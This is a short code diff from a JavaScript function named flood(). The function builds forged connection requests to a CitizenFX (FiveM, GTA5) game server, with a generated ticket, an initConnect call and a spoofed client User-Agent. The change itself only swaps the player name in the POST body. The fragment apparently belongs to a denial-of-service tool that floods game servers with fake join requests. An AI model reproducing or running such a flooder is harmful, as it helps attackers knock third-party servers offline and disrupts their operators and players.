@@ -75,7 +75,7 @@ function flood() {
         const generatedTicket = encodeURIComponent(generateValidTicket());
 
         
-        const postData = `cfxTicket=${generatedTicket}&gameBuild=2372&gameName=gta5&guid=148618792331476182&method=initConnect&name=forky&protocol=12`;
+        const postData = `cfxTicket=${generatedTicket}&gameBuild=2372&gameName=gta5&guid=148618792331476182&method=initConnect&name=aqu1337&protocol=12`;
 
         var genPayload = () => `POST ${urlParsed.pathname} HTTP/1.1\r\nHost: ${urlParsed.host}\r\nUser-Agent: CitizenFX/1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ${postData.length}\r\n\r\n${postData}`;
 
